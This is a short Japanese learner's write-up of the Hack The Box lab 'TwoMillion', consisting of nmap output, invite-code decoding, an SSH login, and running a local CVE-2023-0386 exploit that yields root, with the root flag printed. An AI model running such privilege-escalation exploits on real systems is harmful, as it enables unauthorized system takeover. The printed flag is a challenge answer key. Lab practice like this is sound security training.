偵察

┌──(root㉿kali)-\[/home/kali\]

└─# nmap -sC -sV -A -Pn 2million.htb

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 19:00 JST

Nmap scan report for 2million.htb (10.10.11.221)

Host is up (0.33s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)

\|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)

80/tcp open  http    nginx

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=1/3%OT=22%CT=1%CU=40840%PV=Y%DS=2%DC=T%G=Y%TM=65953

OS:09B%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)O

OS:PS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CS

OS:T11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E

OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F

OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5

OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z

OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=

OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%

OS:CD=S)

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)

HOP RTT       ADDRESS

1   978.04 ms 10.10.14.1

2   978.21 ms 2million.htb (10.10.11.221)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 110.72 seconds

webアクセス

![[TwoMillion image.png]]

Buroでアクセス

![[TwoMillion image 1.png]]

http://2million.htb/js/inviteapi.min.js　を見つけたのでアクセス

難読化されていたのでデコード

ROT13で暗号化されていたので解読したらパスがでてきた

パスにアクセスするとbase64でんエンコードされていたのでデコード

CODEが有効と返ってきたのでテストアカウント作成

![[TwoMillion image 2.png]]

ログインできた

特段見つからなかったので違う階層を見に行ってみる

http://2million.htb/api/vi

この辺からうまくいかなくなったのでwriteup参照

https://qiita.com/schectman-hell/items/7d561952e3e8e9cb8a6c

したけど通信が悪すぎてうまくいかないのでリバースシェルは省略

┌──(root㉿kali)-\[/home/kali/github-tools/reverse-shell-generator\]

└─# ssh admin@10.10.11.221

admin@2million:~$ ls

10.10.14.47:8000  exp      fuse    getshell.c  README.md  test

CVE-2023-0386     exp.c    fuse.c  Makefile    root       user.txt

cve.zip           exploit  gc      ovlcap      snap

なんか怪しいディレクトリがある

admin@2million:~$ cd CVE-2023-0386/

admin@2million:~/CVE-2023-0386$ ls

exp    fuse    gc          Makefile  README.md

exp.c  fuse.c  getshell.c  ovlcap    test

これを使うと権限昇格できるらしい

admin@2million:~/CVE-2023-0386$ ./exp

uid:1000 gid:1000

\[+\] mount success

total 24

drwxrwxr-x 1 root   root     4096 Jan  3 03:38 .

drwxr-xr-x 6 root   root     4096 Jan  3 11:10 ..

-rwsrwxrwx 1 nobody nogroup 16096 Jan  3 05:23 file

\[+\] exploit success!

To run a command as administrator (user "root"), use "sudo \<command>".

See "man sudo_root" for details.

root@2million:~/CVE-2023-0386#

root@2million:/home/admin/CVE-2023-0386# ls /root

'"'                 exp          libc.py     snap

10.10.14.47:8000   exp.c        libc.so.6   thank_you.json

CVE-2023-4911      index.html   root.txt

root@2million:/home/admin/CVE-2023-0386# cat root.txt

cat: root.txt: No such file or directory

root@2million:/home/admin/CVE-2023-0386# cat /root/root.txt

931a334333b65b22291d0ffb8ebc4a60

何とか最後までいけたけど途中のBurpなどは圧倒的に理解不十分

とにかく今は触って慣れる

![[TwoMillion image 3.png]]

![[TwoMillion image 4.png]]

![[TwoMillion image 5.png]]

![[TwoMillion image 6.png]]